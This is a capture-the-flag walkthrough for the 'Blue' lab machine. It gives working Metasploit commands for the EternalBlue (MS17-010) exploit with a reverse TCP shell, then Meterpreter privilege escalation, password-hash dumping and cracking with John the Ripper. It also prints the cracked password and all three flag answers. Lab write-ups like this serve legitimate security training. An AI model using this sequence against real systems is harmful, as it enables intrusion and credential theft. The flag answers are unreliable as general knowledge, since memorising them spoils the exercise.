# Blue Walkthrough

## Background: EternalBlue Exploit

EternalBlue is a computer exploit developed by the U.S. National Security Agency (NSA). It was leaked by the Shadow Brokers hacker group on April 14, 2017, just a month after Microsoft had released patches to address the vulnerability.

On May 12, 2017, the worldwide WannaCry ransomware leveraged the EternalBlue exploit to attack unpatched computers: Subsequently, on June 27, 2017, the exploit was once again employed in the 2017 NotPetya cyberattack against additional unpatched computers.

EternalBlue has been associated with various cyber incidents, including its use by the Chinese hacking group Buckeye (APT3) since March 2016. It was reported that they likely discovered and repurposed the tool: Additionally, the exploit was employed as part of the Retefe banking trojan's operations since at least September 5, 2017.

One of the most notable deployments of EternalBlue was in collaboration with the DoublePulsar backdoor implant tool during the execution of the WannaCry attacks in 2017.

## Overview
This walkthrough guides you through the process of gaining access to a vulnerable machine named "BLUE" and escalating privileges. The steps involve exploiting a vulnerability, discovering user credentials, and implementing server hardening measures.

## Step 1: Port Scanning and Vulnerability Identification

```bash
nmap -sV -sC --script vuln 10.10.200.244
```

The `-sV` flag adds version detection, the `-sC` flag runs default scripts, and the `--script` flag identifies vulnerabilities.

- **Vulnerability Identified:** smb-vuln-ms17-010, CVE-2017-0143

## Step 2: Exploitation

### Metasploit Exploit

```bash
# Start Metasploit
msfconsole

# Search for the ms17-010 exploit
search ms17-010 type:exploit

# Load the EternalBlue module
use exploit/windows/smb/ms17_010_eternalblue

# Set required values, e.g., RHOSTS
show options
set RHOSTS 10.10.200.244

# Set payload and RHOSTS
set payload windows/x64/shell/reverse_tcp
set RHOSTS 10.10.200.244

# Run the exploit
exploit
```

- **Exploitation Code Path:** exploit/windows/smb/ms17_010_eternalblue
- **Required Value:** RHOSTS

### Meterpreter Shell Conversion

```bash
# Background the shell
background

# Search for shell_to_meterpreter module
search shell_to_meterpreter

# Load the shell_to_meterpreter module
use post/multi/manage/shell_to_meterpreter

# Show options and set SESSION value
show options
set SESSION 1

# Run the module
run
```

- **Post Module Path:** post/multi/manage/shell_to_meterpreter
- **Required Option:** SESSION

## Step 3: Privilege Escalation

### Meterpreter Privilege Escalation

```bash
# Background the shell
background

# Verify system access
getsystem

# Migrate to a system process
migrate PROCESS_ID
```

## Step 4: Password Cracking

```bash
# Dump passwords with hashdump
hashdump

# Non-default user found: Jon
# Copy hash to a file (e.g., hash.txt)
echo 'ffb43f0de35be4d9917ac0cc8ad57f8d' > hash.txt

# Crack password with John the Ripper
john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

- **Non-default User:** Jon
- **Cracked Password:** alqfna22

## Step 5: Flag Hunt

### Flag 1

```bash
# Navigate to system root
cd /
ls
cat flag1.txt
```

- **Flag 1:** flag{access_the_machine}

### Flag 2

```bash
# Navigate to hashed password location
cd C:/Windows/System32/config
ls
cat flag2.txt
```

- **Flag 2:** flag{sam_database_elevated_access}

### Flag 3

```bash
# Navigate to Jon's Documents folder
cd /Users/Jon/Documents
ls
cat flag3.txt
```

- **Flag 3:** flag{admin_documents_can_be_valuable}

---

**Congratulations!** You have completed the Blue walkthrough. If you found this helpful, consider giving it a thumbs up!
